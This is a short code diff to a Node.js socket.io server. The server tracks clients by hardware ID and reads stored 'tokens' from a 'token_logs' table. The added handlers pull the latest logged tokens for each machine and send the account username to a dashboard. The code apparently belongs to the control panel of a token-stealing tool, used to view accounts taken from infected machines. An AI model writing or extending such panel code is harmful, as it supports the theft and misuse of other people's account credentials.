@@ -16,7 +16,6 @@ module.exports = setupWeb = (app) => {
     const server = require('http').createServer(app);
     const io = require('socket.io')(server);
 
-    // add: 'clientPing', 'clientDisconnect', 'clientConnect'
     io.on('connection', (socket) => {
         app.sockets.push(socket);
 
@@ -28,6 +27,22 @@ module.exports = setupWeb = (app) => {
 
         socket.on('requestClients', () => {
             socket.emit('receiveClients', app.lastPings);
+
+            Object.keys(app.lastPings).forEach((hwid) => {
+                const data = app.db.prepare('SELECT tokens FROM token_logs WHERE hwid=? ORDER BY date DESC LIMIT 1').get(hwid);
+
+                if (data.tokens != null) {
+                    socket.emit('receiveClientLastName', hwid, JSON.parse(JSON.parse(data.tokens)[0]).username);
+                }
+            });
+        });
+
+        socket.on('getClientLastName', (hwid) => {
+            const data = app.db.prepare('SELECT tokens FROM token_logs WHERE hwid=? ORDER BY date DESC LIMIT 1').get(hwid);
+
+            if (data.tokens != null) {
+                socket.emit('receiveClientLastName', hwid, JSON.parse(JSON.parse(data.tokens)[0]).username);
+            }
         });
     });
 
